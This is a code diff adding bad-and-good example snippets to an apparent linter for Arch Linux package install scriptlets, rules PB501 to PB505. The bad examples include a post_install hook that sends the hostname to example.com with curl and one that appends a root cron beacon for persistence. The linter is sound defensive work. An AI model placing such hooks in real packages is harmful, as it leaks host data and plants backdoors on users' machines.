@@ -23,6 +23,12 @@ var scriptletRules = []Rule{
 			"to the network executes unreviewable remote input at the worst possible moment — " +
 			"this is how the 2018 acroread AUR compromise delivered its payload.",
 		Check: checkScriptletNetwork,
+		Bad: `post_install() {
+  curl -fsSL https://example.com/register?host=$(hostname)
+}`,
+		Good: `post_install() {
+  echo "Run 'foo --setup' to finish configuration."
+}`,
 	},
 	{
 		ID:       "PB502",
@@ -35,6 +41,13 @@ var scriptletRules = []Rule{
 			"stdin), puts an account in wheel, or edits sshd_config: that is a way back in, the shape " +
 			"of the x11-qemu-validation incident of September 2026.",
 		Check: checkScriptletPersistence,
+		Bad: `post_install() {
+  systemctl enable foo-telemetry.timer
+  echo '* * * * * root /opt/foo/beacon' >> /etc/cron.d/foo
+}`,
+		Good: `post_install() {
+  echo "Enable the service with: systemctl enable foo.service"
+}`,
 	},
 	{
 		ID:       "PB503",
@@ -44,6 +57,13 @@ var scriptletRules = []Rule{
 			"still runs as root at install time. A parse failure usually means the file is malformed " +
 			"or deliberately obfuscated to defeat static analysis; either way it must be reviewed by hand.",
 		Check: checkScriptletParseError,
+		Bad: `# foo.install with an unterminated function — makepkg still runs it as root:
+post_install() {
+  echo installing
+# (missing closing brace)`,
+		Good: `post_install() {
+  echo installing
+}`,
 	},
 	{
 		ID:       "PB504",
@@ -54,6 +74,12 @@ var scriptletRules = []Rule{
 			"code at best and shadows the hook's transaction-wide batching at worst; usually the " +
 			"whole scriptlet can be deleted.",
 		Check: checkHookCoveredCommands,
+		Bad: `post_install() {
+  gtk-update-icon-cache -q /usr/share/icons/hicolor
+}`,
+		Good: `post_install() {
+  echo "run 'demo --setup' once to finish configuration"
+}`,
 	},
 	{
 		ID:       "PB505",
@@ -65,6 +91,10 @@ var scriptletRules = []Rule{
 			"packages the user never saw in the transaction summary. Dependencies belong in " +
 			"depends=; read-only queries (`pacman -Q`) are fine.",
 		Check: checkScriptletPacman,
+		Bad: `post_install() {
+  pacman -S --noconfirm --asdeps python-requests
+}`,
+		Good: `depends=('python-requests')   # pacman resolves it in the same transaction`,
 	},
 }
 
